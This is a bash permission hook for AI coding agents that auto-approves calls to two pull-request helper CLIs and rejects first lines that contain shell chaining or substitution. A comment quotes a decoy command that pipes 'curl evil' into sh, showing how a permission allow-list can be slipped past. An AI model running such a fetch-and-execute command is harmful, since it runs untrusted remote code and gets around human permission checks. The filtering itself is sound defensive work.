#!/bin/bash
# PreToolUse hook: pre-approve `python3 .../pr_babysit_cli.py ...` and
# `python3 .../pr_churn_cli.py ...` invocations so the auto-mode classifier
# doesn't gate them on every pass of a pr-babysit loop or a churn run.
# pr_babysit_cli.py's surface is GitHub read/write via `gh` (review data,
# failed-check logs, threaded replies, PR comments) plus an explicit-file
# `git commit && push`. pr_churn_cli.py reads via `gh` and local files only,
# and writes timeline.json or boundaries.json into the directory it is given.
# Neither runs arbitrary code or
# interpolates untrusted input into a shell.
#
# Disable this hook to restore per-call permission interception for both CLIs
# (and accept many more prompts per run).
#
# Outputs a PreToolUse allow decision on match. The dialect matches whichever
# harness is running: Claude Code, Cursor, or Grok Build. Silent no-op
# otherwise (falls through to the normal allow-list + classifier flow).

set -euo pipefail

command -v jq >/dev/null 2>&1 || exit 0

source "$(dirname "${BASH_SOURCE[0]}")/hook_runtime.sh"

input=$(cat)
hook_runtime_init "$input"
cmd="$HOOK_COMMAND"

# Approve only a first-line invocation of the form `python3 <path>/scripts/
# pr_babysit_cli.py ...` (or pr_churn_cli.py), where:
#   - `python3` is the executable (NOT `python3 -c/-m ...`, which would run
#     arbitrary code with the CLI path riding along in a comment or string);
#   - `/scripts/pr_babysit_cli.py` appears as a literal substring. That suffix
#     is distinctive and common to both layouts:
#       - dev:       /...checkout.../plugins/wild-pr/scripts/pr_babysit_cli.py
#       - installed: /...cache/wild-horses/wild-pr/<version>/scripts/pr_babysit_cli.py
#     (The `wild-pr` segment is NOT adjacent to `scripts` in the installed path — a
#     version directory sits between them — so we anchor on `/scripts/`.)
#   - the INVOCATION LINE carries no shell chaining/substitution (`;`, `|`, `&`,
#     backtick, `$(`), so a decoy like `... pr_babysit_cli.py; curl evil | sh`
#     cannot ride the allow-list.
#
# Only the first physical line is metacharacter-checked: reply/comment bodies
# arrive as a heredoc on subsequent lines and legitimately contain markdown
# metacharacters (backticks, pipes) that must not disqualify the invocation.
# pr_churn_cli.py takes no heredoc, so its command must be one line: a second
# line would otherwise run as a separate, unchecked shell command.
# This is a prompt-reduction convenience for the agent's own CLI calls, not a
# sandbox; it deliberately does not attempt full shell parsing.
first_line="${cmd%%$'\n'*}"

allow=false
if [[ "$cmd" =~ ^python3[[:space:]] ]] \
   && [[ ! "$first_line" =~ ^python3[[:space:]]+- ]] \
   && [[ "$first_line" == *"/scripts/pr_babysit_cli.py"* \
      || ( "$first_line" == *"/scripts/pr_churn_cli.py"* && "$cmd" == "$first_line" ) ]]; then
    case "$first_line" in
        *';'*|*'|'*|*'&'*|*'`'*|*'$('*) : ;;   # chaining/substitution → do not approve
        *) allow=true ;;
    esac
fi

if [[ "$allow" == true ]]; then
    hook_runtime_emit_allow "wild-pr CLI is plugin-approved"
fi
